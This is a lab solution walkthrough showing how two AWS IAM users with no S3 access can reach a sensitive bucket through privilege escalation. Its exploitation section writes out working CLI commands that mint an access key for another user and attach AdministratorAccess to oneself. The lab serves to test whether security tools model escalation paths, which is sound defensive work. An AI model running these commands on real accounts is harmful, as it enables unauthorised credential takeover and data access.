# Solution: Reverse Blast Radius Including Privilege Escalations to Bucket

Reverse blast radius asks a deceptively simple question: who can read this bucket? The easy answer is "whoever has an S3 statement that names it." But that answer is incomplete the moment privilege escalation enters the picture. A principal that cannot touch the bucket today may hold an IAM permission that lets it grant itself the access in a single step -- and if your tooling only follows explicit grants, it will report that principal as harmless.

This lab isolates that gap. One principal reads the bucket directly. Two others hold no S3 access at all, only IAM permissions, yet each can escalate into bucket access: one by minting an access key for the reader, the other by attaching `AdministratorAccess` to itself. A direct-only query must return exactly one principal; an escalation-aware query must return all three.

Because the two escalators actually perform live privilege escalation, this lab's demo makes real out-of-band IAM changes. The cleanup script undoes them. That is the price of proving the escalation with real AWS calls rather than a policy simulation.

## The Challenge

You have credentials for three principals:

- `pl-prod-rbr-esc-bucket-reader` -- explicit `s3:GetObject` and `s3:ListBucket` on the bucket, nothing else
- `pl-prod-rbr-esc-cak-user` -- only `iam:CreateAccessKey` on `bucket-reader`, no S3 access of its own
- `pl-prod-rbr-esc-attach-self-user` -- only `iam:AttachUserPolicy` on itself, no S3 access of its own

The target is the `pl-sensitive-data-rbr-esc-{account_id}-{suffix}` bucket, which has no bucket policy. Your goal is to confirm the true reachability of the bucket -- both who can read it today and who can read it after escalating -- and then check that your security tool reports the same two answers for the same two questions.

## Reconnaissance

Start by confirming who you are for each set of credentials:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# Expected: arn:aws:iam::{account_id}:user/pl-prod-rbr-esc-cak-user
```

Then look at what each escalator actually holds. These inline policies are the whole story:

```bash
aws iam get-user-policy --user-name pl-prod-rbr-esc-cak-user --policy-name pl-prod-rbr-esc-cak-user-policy
# Expected: iam:CreateAccessKey on the bucket-reader user ARN

aws iam get-user-policy --user-name pl-prod-rbr-esc-attach-self-user --policy-name pl-prod-rbr-esc-attach-self-user-policy
# Expected: iam:AttachUserPolicy on its own user ARN
```

Neither escalator mentions S3 anywhere. On paper they look like they have nothing to do with the bucket. That is exactly the illusion this lab is built to expose: each one is a single IAM call away from reading it.

## Exploitation

### The direct reader

As `bucket-reader`, list and read the bucket. No escalation is required -- this is the baseline direct access:

```bash
aws s3 ls "s3://pl-sensitive-data-rbr-esc-{account_id}-{suffix}/"
aws s3 cp "s3://pl-sensitive-data-rbr-esc-{account_id}-{suffix}/sensitive-data.txt" -
```

This is the only principal that belongs in a direct-only answer.

### Escalation by minting a key: cak-user

As `cak-user`, a direct read is denied -- the user has no S3 permission:

```bash
aws s3 cp "s3://pl-sensitive-data-rbr-esc-{account_id}-{suffix}/sensitive-data.txt" -
# Expected: AccessDenied
```

But `cak-user` can mint a brand new access key for `bucket-reader`. Creating that key hands you a working set of long-term credentials for a principal that *can* read the bucket:

```bash
aws iam create-access-key --user-name pl-prod-rbr-esc-bucket-reader \
  --query 'AccessKey.[AccessKeyId,SecretAccessKey]' --output text
```

Export the returned key and secret, then read the bucket as `bucket-reader`:

```bash
aws s3 cp "s3://pl-sensitive-data-rbr-esc-{account_id}-{suffix}/sensitive-data.txt" -
```

The read succeeds. `cak-user` reached the bucket through a one-step escalation, so an escalation-aware reverse blast radius query must list it.

### Escalation by self-attachment: attach-self-user

As `attach-self-user`, a direct read is also denied:

```bash
aws s3 cp "s3://pl-sensitive-data-rbr-esc-{account_id}-{suffix}/sensitive-data.txt" -
# Expected: AccessDenied
```

This user can attach any managed policy to its own identity. Attach `AdministratorAccess` and you become an administrator -- which can read every bucket in the account:

```bash
aws iam attach-user-policy --user-name pl-prod-rbr-esc-attach-self-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
# Wait ~15 seconds for IAM to propagate the new policy
aws s3 cp "s3://pl-sensitive-data-rbr-esc-{account_id}-{suffix}/sensitive-data.txt" -
```

The read now succeeds through administrator permissions rather than any S3-specific grant. `attach-self-user` reached the bucket through a self-escalation, so it too belongs in the escalation-aware answer.

## Verification

The true reachability of the bucket is now confirmed with live calls. A correct tool should return two different answers to two different questions.

Question: "Who can read `pl-sensitive-data-rbr-esc-{account_id}-{suffix}` directly, with no escalation?"

```
- arn:aws:iam::{account_id}:user/pl-prod-rbr-esc-bucket-reader
```

Question: "Who can read `pl-sensitive-data-rbr-esc-{account_id}-{suffix}` if privilege escalation is allowed?"

```
- arn:aws:iam::{account_id}:user/pl-prod-rbr-esc-bucket-reader
- arn:aws:iam::{account_id}:user/pl-prod-rbr-esc-cak-user
- arn:aws:iam::{account_id}:user/pl-prod-rbr-esc-attach-self-user
```

If your tool returns all three for the direct-only question, it is over-counting -- treating escalation as if it were direct access. If it returns only `bucket-reader` for the escalation-aware question, it is under-counting -- ignoring escalation paths entirely. And if it catches the `iam:CreateAccessKey` escalation but misses the `iam:AttachUserPolicy` self-escalation (or the reverse), it only models some escalation primitives.

Because the demo attached a real managed policy and minted a real access key, run `cleanup_attack.sh` afterward to delete the minted key and detach `AdministratorAccess`, restoring the lab to its deployed state.

## What Happened

You saw that "who can read this bucket" has two correct answers depending on whether privilege escalation is in scope. The direct reader is easy to find because its policy names the bucket. The two escalators are easy to miss because nothing in their policies mentions S3 -- yet each is a single IAM call away from full read access, one by minting credentials for a reader and one by making itself an administrator.

In real environments this is where reverse blast radius quietly understates exposure. An access review that lists only principals with explicit S3 statements will declare a sensitive bucket well-contained while `iam:CreateAccessKey` and `iam:AttachUserPolicy` grants sit one hop away. This lab gives you a fixed truth table to check whether your tooling follows escalation edges when it answers reachability questions, and whether it keeps the direct-only and escalation-aware answers cleanly separated.
